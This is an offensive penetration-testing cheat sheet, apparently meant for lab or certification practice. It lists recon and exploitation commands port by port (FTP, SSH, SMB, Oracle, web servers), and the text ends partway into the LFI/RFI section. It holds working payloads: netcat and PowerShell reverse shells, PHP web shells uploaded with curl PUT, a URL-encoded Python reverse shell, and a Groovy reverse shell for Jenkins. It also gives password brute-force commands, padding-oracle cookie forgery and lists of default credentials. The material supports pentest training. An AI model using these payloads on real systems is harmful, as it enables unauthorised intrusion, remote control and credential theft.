Table of Contents
=================

   * [Table of Contents](#table-of-contents)
   * [<strong>Recon</strong>](#recon)
      * [Enumeration AIO](#enumeration-aio)
      * [File enumeration](#file-enumeration)
         * [Common](#common)
         * [Disk files](#disk-files)
         * [Images](#images)
         * [Audio](#audio)
      * [Port 21 - FTP](#port-21---ftp)
      * [Port 22 - SSH](#port-22---ssh)
      * [Port 25 - Telnet](#port-25---telnet)
      * [Port 69 - UDP - TFTP](#port-69---udp---tftp)
      * [Kerberos - 88](#kerberos---88)
      * [Port 110 - Pop3](#port-110---pop3)
      * [Port 111 - Rpcbind](#port-111---rpcbind)
      * [Port 135 - MSRPC](#port-135---msrpc)
      * [Port 139/445 - SMB](#port-139445---smb)
      * [Port 161/162 UDP - SNMP](#port-161162-udp---snmp)
      * [LDAP - 389,636](#ldap---389636)
      * [HTTPS - 443](#https---443)
      * [500 - ISAKMP IKE](#500---isakmp-ike)
      * [513 - Rlogin](#513---rlogin)
      * [541 - FortiNet SSLVPN](#541---fortinet-sslvpn)
      * [Port 554 - RTSP](#port-554---rtsp)
      * [Port 1030/1032/1033/1038](#port-1030103210331038)
      * [MSSQL - 1433](#mssql---1433)
      * [Port 1521 - Oracle](#port-1521---oracle)
      * [Port 2049 - NFS](#port-2049---nfs)
      * [Port 2100 - Oracle XML DB](#port-2100---oracle-xml-db)
      * [3306 - MySQL](#3306---mysql)
      * [Port 3339 - Oracle web interface](#port-3339---oracle-web-interface)
      * [RDP - 3389](#rdp---3389)
      * [WinRM - 5985](#winrm---5985)
      * [VNC - 5900](#vnc---5900)
      * [Redis - 6379](#redis---6379)
      * [MsDeploy - 8172](#msdeploy---8172)
      * [Webdav](#webdav)
      * [Unknown ports](#unknown-ports)
      * [Port 80 - Web server](#port-80---web-server)
         * [Url brute force](#url-brute-force)
         * [Default/Weak login](#defaultweak-login)
         * [LFI/RFI](#lfirfi)
         * [SQL-Injection](#sql-injection)
         * [XSS](#xss)
         * [Sql-login-bypass](#sql-login-bypass)
         * [Bypass image upload restrictions](#bypass-image-upload-restrictions)
      * [Password brute force - last resort](#password-brute-force---last-resort)
   * [<strong>Vulnerability analysis</strong>](#vulnerability-analysis)
      * [BOF](#bof)
      * [Find xploits - Searchsploit and google](#find-xploits---searchsploit-and-google)
      * [Reverse Shells](#reverse-shells)
   * [<strong>Privilege escalation</strong>](#privilege-escalation)
      * [Common](#common-1)
         * [Set up Webserver](#set-up-webserver)
         * [Set up FTP Server](#set-up-ftp-server)
         * [Set up TFTP](#set-up-tftp)
      * [Linux](#linux)
         * [Useful commands](#useful-commands)
         * [Basic info](#basic-info)
         * [Kernel exploits](#kernel-exploits)
         * [Programs running as root](#programs-running-as-root)
         * [Installed software](#installed-software)
         * [Weak/reused/plaintext passwords](#weakreusedplaintext-passwords)
         * [Inside service](#inside-service)
         * [Suid misconfiguration](#suid-misconfiguration)
         * [Unmounted filesystems](#unmounted-filesystems)
         * [Cronjob](#cronjob)
         * [SSH Keys](#ssh-keys)
         * [Bad path configuration](#bad-path-configuration)
         * [Find plain passwords](#find-plain-passwords)
         * [Scripts](#scripts)
            * [SUID](#suid)
            * [PS Monitor for cron](#ps-monitor-for-cron)
         * [Linux Privesc Tools](#linux-privesc-tools)
         * [Linux Precompiled Exploits](#linux-precompiled-exploits)
      * [Windows](#windows)
         * [Basic info](#basic-info-1)
         * [Kernel exploits](#kernel-exploits-1)
         * [Cleartext passwords](#cleartext-passwords)
         * [Reconfigure service parameters](#reconfigure-service-parameters)
         * [Dump process for passwords](#dump-process-for-passwords)
         * [Inside service](#inside-service-1)
         * [Programs running as root/system](#programs-running-as-rootsystem)
         * [Installed software](#installed-software-1)
         * [Scheduled tasks](#scheduled-tasks)
         * [Weak passwords](#weak-passwords)
         * [Add user and enable RDP](#add-user-and-enable-rdp)
         * [Powershell sudo for Windows](#powershell-sudo-for-windows)
         * [Windows download with bitsadmin](#windows-download-with-bitsadmin)
         * [Windows download with certutil.exe](#windows-download-with-certutilexe)
         * [Windows download with powershell](#windows-download-with-powershell)
         * [Windows Download from FTP](#windows-download-from-ftp)
         * [Windows create SMB Server transfer files](#windows-create-smb-server-transfer-files)
         * [Windows download with VBS](#windows-download-with-vbs)
         * [Windowss XP SP1 PrivEsc](#windowss-xp-sp1-privesc)
         * [Pass The Hash](#pass-the-hash)
         * [Scripts](#scripts-1)
            * [Useradd](#useradd)
            * [Powershell Run As](#powershell-run-as)
            * [Powershell Reverse Shell](#powershell-reverse-shell)
         * [Windows privesc/enum tools](#windows-privescenum-tools)
         * [Windows precompiled exploits](#windows-precompiled-exploits)
         * [Windows Port Forwarding](#windows-port-forwarding)
   * [<strong>Loot</strong>](#loot)
      * [Linux](#linux-1)
         * [Proof](#proof)
         * [Network secret](#network-secret)
         * [Passwords and hashes](#passwords-and-hashes)
         * [Dualhomed](#dualhomed)
         * [Tcpdump](#tcpdump)
         * [Interesting files](#interesting-files)
         * [Databases](#databases)
         * [SSH-Keys](#ssh-keys-1)
         * [Browser](#browser)
         * [Mail](#mail)
         * [GUI](#gui)
      * [Windows](#windows-1)
         * [Proof](#proof-1)
         * [Passwords and hashes](#passwords-and-hashes-1)
         * [Dualhomed](#dualhomed-1)
         * [Tcpdump](#tcpdump-1)
         * [Interesting files](#interesting-files-1)

# **Recon**

```
# Enumerate subnet
nmap -sn 10.11.1.1/24

# Fast simple scan
nmap -sS 10.11.1.111

# Full complete slow scan with output
nmap -v -sT -A -T4 -p- -Pn --script vuln -oA full 10.11.1.111

# Autorecon
python3 autorecon.py 10.11.1.111

# OneTwoPunch
https://raw.githubusercontent.com/superkojiman/onetwopunch/master/onetwopunch.sh
onetwopunch.sh ip.txt tcp

# Scan for UDP
nmap 10.11.1.111 -sU
unicornscan -mU -v -I 10.11.1.111

# Connect to udp if one is open
nc -u 10.11.1.111 48772

# Responder
responder -I eth0 -A

# Amass
amass enum -ip 10.11.1.1/24

```
- sparta
- `python /root/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.11.1.111 -o test --services`


## Enumeration AIO
[Penetration Testing Methodology - 0DAYsecurity.com](http://0daysecurity.com/penetration-testing/enumeration.html)

## File enumeration

### Common

```bash
# Check real file type
file file.xxx

# Analyze strings
strings file.xxx
strings -a -n 15 file.xxx # Check the entire file and outputs strings longer than 15 chars

# Check embedded files
binwalk file.xxx # Check
binwalk -e file.xxx # Extract

# Check as binary file in hex
ghex file.xxx

# Check metadata
exiftool file.xxx

# Stego tool for multiple formats
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe
```

### Disk files

```bash
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
```

### Images

```bash
# Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar

# Stegpy
stegpy -p file.png

# Check png corrupted
pngcheck -v image.jpeg

# Check what kind of image is
identify -verbose image.jpeg
```

### Audio

```bash
# Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb

# Check for Stego
hideme stego.mp3 -f && cat output.txt #AudioStego
```



## Port 21 - FTP

```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111
```

## Port 22 - SSH

- If you have usernames test login with username:username
- Vulnerable Versions: 7.2p1

```
Vulnerable Versions: 7.2p1
nc 10.11.1.111 22

User can ask to execute a command right after authentication before it’s default command or shell is executed

$ ssh -v user@10.10.1.111 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(user) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

Check Auth Methods:

$ ssh -v 10.10.1.111
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

Force Auth Method:

$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
...
debug1: Next authentication method: password

BruteForce:

patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
Id
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
Reverse
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"

SSH FUZZ
https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

cpan Net::SSH2
./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user

use auxiliary/fuzzers/ssh/ssh_version_2

SSH-AUDIT
https://github.com/arthepsy/ssh-audit

• https://www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow
• https://www.exploit-db.com/exploits/45001 ~ OpenSSH < 6.6 SFTP – Command Execution                             
• https://www.exploit-db.com/exploits/45233 ~ OpenSSH 2.3 < 7.7 – Username Enumeration                             
• https://www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files                             

http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html


SSH Enum users < 7.7:
https://github.com/six2dez/ssh_enum_script
https://www.exploit-db.com/exploits/45233
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"

```

## Port 25 - Telnet

```
nc -nvv 10.11.1.111 25
HELO foo<cr><lf>

telnet 10.11.1.111 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t 10.11.1.111

Send email unauth:

MAIL FROM:admin@admin.com
RCPT TO:DestinationEmail@DestinationDomain.com
DATA
test

.

Receive:
250 OK
```

## Port 69 - UDP - TFTP

This is used for tftp-server.

- Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.
- Checks of FTP Port 21.

```
nmap -p69 --script=tftp-enum.nse 10.11.1.111
```

## Kerberos - 88

```
- MS14-068
- GetUserSPNs
GET USERS:

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" IP
use auxiliary/gather/kerberos_enumusers

https://www.tarlogic.com/blog/como-funciona-kerberos/
https://www.tarlogic.com/blog/como-atacar-kerberos/

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt

https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
```

## Port 110 - Pop3

```
telnet 10.11.1.111
USER pelle@10.11.1.111
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

## Port 111 - Rpcbind

```
rpcinfo -p 10.11.1.111
rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall
```


## Port 135 - MSRPC

Some versions are vulnerable.

```
nmap 10.11.1.111 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
```

## Port 139/445 - SMB


```
# Enum hostname
enum4linux -n 10.11.1.111
nmblookup -A 10.11.1.111
nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111

# Get Version
smbver.sh 10.11.1.111
Msfconsole;use scanner/smb/smb_version
ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' 
smbclient -L \\\\10.11.1.111

# Get Shares
smbmap -H  10.11.1.111 -R <sharename>
echo exit | smbclient -L \\\\10.11.1.111
smbclient \\\\10.11.1.111\\<share>
smbclient -L //10.11.1.111 -N
nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111
smbclient -L \\\\10.11.1.111\\

# Check null sessions
smbmap -H 10.11.1.111
rpcclient -U "" -N 10.11.1.111
smbclient //10.11.1.111/IPC$ -N

# Exploit null sessions
enum -s 10.11.1.111
enum -U 10.11.1.111
enum -P 10.11.1.111
enum4linux -a 10.11.1.111
/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111

# Connect to username shares
smbclient //10.11.1.111/share -U username

# Connect to share anonymously
smbclient \\\\10.11.1.111\\<share>
smbclient //10.11.1.111/<share>
smbclient //10.11.1.111/<share\ name>
smbclient //10.11.1.111/<""share name"">
rpcclient -U " " 10.11.1.111
rpcclient -U " " -N 10.11.1.111

# Check vulns
nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111

# Check common security concerns
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_checks.rc

# Extra validation
msfconsole -r /usr/share/metasploit-framwork/scripts/resource/smb_validate.rc

# Multi exploits
msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run

# Bruteforce login
medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt 
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvv
nmap –script smb-brute 10.11.1.111

# nmap smb enum & vuln 
nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111

# Mount smb volume linux
mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share

# rpcclient commands
rpcclient -U "" 10.11.1.111
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

# Run cmd over smb from linux
winexe -U username //10.11.1.111 "cmd.exe" --system

# smbmap
smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 #Enum
smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group "Domain Admins" /domain' -H 10.11.1.111 #RCE
smbmap.py -H 10.11.1.111 -u username -p 'P@$$w0rd1234!' -L # Drive Listing
smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.X""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' # Reverse Shell

# Check
\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&pass "gpp-decrypt "
```


## Port 161/162 UDP - SNMP

```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
snmp-check 10.11.1.111 -c public|private|community

```

## LDAP - 389,636

```
ldapsearch -h 10.11.1.111 -p 389 -x -b "dc=mywebsite,dc=com"
ldapsearch -x -h 10.11.1.111 -D 'DOMAIN\user' -w 'hash-password'
ldapdomaindump 10.11.1.111 -u 'DOMAIN\user' -p 'hash-password'
patator ldap_login host=10.10.1.111 1=/root/Downloads/passwords_ssh.txt user=hsmith password=FILE1 -x ignore:mesg='Authentication failed.'
```

## HTTPS - 443

Read the actual SSL CERT to:

- find out potential correct vhost to GET
- is the clock skewed
- any names that could be usernames for bruteforce/guessing.

```
sslscan 10.11.1.111:443
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
nmap -sV --script=ssl-heartbleed 10.1.10.111
mod_ssl,OpenSSL version Openfuck
```

## 500 - ISAKMP IKE

```
ike-scan 10.11.1.111
```

## 513 - Rlogin

```
apt install rsh-client
rlogin -l root 10.11.1.111
```

## 541 - FortiNet SSLVPN

[Fortinet Ports Guide](https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png)

[SSL VPN Leak](https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?__cf_chl_jschl_tk__=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql_GT_ovKiar_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6_R9Dtw89_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5_iK0kMNJg3mskrFVQz0lONaZVvFRdf_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s_lVIj2SAJQQ)

## Port 554 - RTSP

- Web interface, transfer images, streaming


## Port 1030/1032/1033/1038

Used by RPC to connect in domain network.

## MSSQL - 1433

```
nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
sqsh -S 10.11.1.111 -U sa
	xp_cmdshell 'date'
  	go

```

## Port 1521 - Oracle

```
oscanner -s 10.11.1.111 -P 1521
tnscmd10g version -h 10.11.1.111
tnscmd10g status -h 10.11.1.111
nmap -p 1521 -A 10.11.1.111
nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
MSF: good modules under auxiliary/admin/oracle and scanner/oracle

./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521
./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE

Upload reverse shell with ODAT:
./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe

and run it:
./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe


```

## Port 2049 - NFS

```
showmount -e 10.11.1.111

If you find anything you can mount it like this:

mount 10.11.1.111:/ /tmp/NFS
mount -t 10.11.1.111:/ /tmp/NFS
```

## Port 2100 - Oracle XML DB

```
FTP:
	sys:sys
	scott:tiger
```

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm


## 3306 - MySQL

```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306

mysql --host=10.11.1.111 -u root -p

MYSQL UDF 
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

## Port 3339 - Oracle web interface


- Basic info about web service (apache, nginx, IIS)

## RDP - 3389

```
nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p guest 10.11.1.111 -g 94%
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
```

## VNC - 5900

```
nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
```

## WinRM - 5985

```
https://github.com/Hackplayers/evil-winrm
gem install evil-winrm
evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
```

## Redis - 6379

```
https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis
```

## MsDeploy - 8172

```
Microsoft IIS Deploy port
IP:8172/msdeploy.axd
```

## Webdav

```
davtest -cleanup -url http://target
cadaver http://target
```

## Unknown ports

- `amap -d 10.11.1.111 8000`
- netcat: makes connections to ports. Can echo strings or give shells: `nc -nv 10.11.1.111 110`
- sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, 	using basic HTTP configurations
- Try zone transfer for subdomains: `dig axfr @10.11.1.111 hostname.box`, `dnsenum 10.11.1.111`, `dnsrecon -d domain.com -t axfr`

Try admin:admin, user:user

## Port 80 - Web server

- Basics:
  - Navigate && robots.txt
  - Headers
  - Source Code

```
# Nikto
nikto -h http://10.11.1.111

# Nikto with squid proxy
nikto -h 10.11.1.111 -useproxy http://10.11.1.111:4444

# CMS Explorer
cms-explorer -url http://10.11.1.111 -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://10.11.1.111
wpscan --url http://10.11.1.111 --enumerate vp
wpscan --url http://10.11.1.111 --enumerate vt
wpscan --url http://10.11.1.111 --enumerate u
wpscan -e --url https://url.com


Check IP behing WAF:
https://IP.com/2020/01/22/discover-cloudflare-wordpress-ip/
pingback.xml:
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
 <param>
  <value>
   <string>http://10.0.0.1/hello/world</string>
  </value>
 </param>
 <param>
  <value>
   <string>https://IP.com/2020/01/22/hello-world/</string>
  </value>
 </param>
</params>
</methodCall>

curl -X POST -d @pingback.xml https://ip.com/xmlrpc.php

Enum User:
for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}'; done

# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# Get header
curl -i 10.11.1.111

# Get options
curl -i -X OPTIONS 10.11.1.111

	# With PUT option enabled:
	
	nmap -p 80 10.1.10.111 --script http-put --script-args http-put.url='/test/rootme.php',http-put.file='/root/php-reverse-shell.php'

	curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://10.1.10.111/test/cmd.php
	&& http://10.1.10.111/test/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%210.1.10.111%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

# Get everything
curl -i -L 10.11.1.111
curl -i -H "User-Agent:Mozilla/4.0" http://10.11.1.111:8080

# Check for title and all links
curl 10.11.1.111 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl 10.11.1.111 -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://10.11.1.111/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.11.1.111/test/shell.php

# Simple curl POST request with login data
curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

site:domain.com intext:user


# Firebase
https://github.com/Turr0n/firebase
python3 firebase.py -p 4 --dnsdumpster -l file

```

### Url brute force

```
# Ffuf
ffuf -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','xml','.log' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://10.11.1.11/mvc/FUZZ

# Dirb not recursive
dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt

# Wfuzz
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.11/FUZZ

# GoBuster
gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt

dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix

./dirsearch.py -u 10.10.10.157 -e php

medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10

Crawl:

dirhunt https://url.com/
hakrwaler https://url.com/

Fuzzer:

ffuf -recursion -c -e '.htm','.php','.html','.js','.txt','.zip','.bak','.asp','.aspx','.xml' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://url.com/FUZZ

dirsearch -r -f -u https://crm.comprarcasa.pt --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --request-by-hostname -t 40

#IIS
#ViewState:
https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC

#WebResource.axd:
https://github.com/inquisb/miscellaneous/blob/master/ms10-070_check.py

#ShortNames
https://github.com/irsdl/IIS-ShortName-Scanner
java -jar iis_shortname_scanner.jar 2 20 http://domain.es

#Jenkins
JENKINSIP/PROJECT//securityRealm/user/admin
JENKINSIP/jenkins/script

#Groovy RCE
def process = "cmd /c whoami".execute();println "${process.text}";
#Groovy RevShell
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Joomscan
joomscan -u  http://10.11.1.111 
joomscan -u  http://10.11.1.111 --enumerate-components

# PHP bypass disable_functions and open_basedir
# Chankro
https://github.com/TarlogicSecurity/Chankro
python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html

# Cookies error padding:
# Get cookie structure
padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"
# Get cookie for other user (impersonation)
padbuster http://10.10.1.111/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorme'
```


### Default/Weak login

Search documentation for default passwords and test them

```
site:webapplication.com password
```

```
admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>
```


### LFI/RFI


```
fimap -u "http://10.11.1.111/example.php?test="

